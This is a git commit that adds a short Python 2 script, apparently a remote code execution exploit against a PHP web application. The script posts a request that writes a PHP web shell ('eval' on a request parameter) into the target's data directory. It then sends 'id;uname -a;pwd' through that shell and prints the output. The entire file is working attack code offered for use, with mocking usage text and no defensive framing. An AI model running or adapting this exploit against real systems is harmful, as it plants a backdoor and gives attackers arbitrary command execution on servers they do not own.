f015a12f5608d9de826fc3ce2340a03d117b0ad3
David Davidson <darren@0x27.me>
2017-11-29 10:26:28 +0000

    Create totallynotarce.py

---
+++ TotallyNotARCE/totallynotarce.py
@@ -0,0 +1,34 @@
+#!/usr/bin/python2
+import requests
+import sys
+
+def drop_shell(target_url):
+    print "{+} Dropping a shell on the target..."
+    data = {"mac": "urmum.php",
+            "d": "<?php eval($_REQUEST[1337]);"}
+    try:
+        r = requests.post(target_url, data=data, verify=False)
+    except Exception:
+        sys.exit("NOPE!")
+    lol = target_url.split("/")[-1]
+    shell_url = target_url.replace(lol, "data/urmum.php")
+    print "{+} Shell Uploaded. It should be at %s" %(shell_url)
+    return shell_url
+
+def check_shell(shell_url):
+    print "{+} Sending id;uname -a;pwd...\n\n"
+    data = {"1337": 'system("id;uname -a;pwd");'}
+    try:
+        r = requests.post(shell_url, data=data, verify=False)
+        print r.content
+    except Exception, e:
+        sys.exit(str(e))
+
+def main(args):
+    if len(args) != 2:
+        sys.exit("use: %s http://skidsr.us/p.php" %(args[0]))
+    shell_url = drop_shell(target_url=args[1])
+    check_shell(shell_url)
+
+if __name__ == "__main__":
+    main(args=sys.argv)
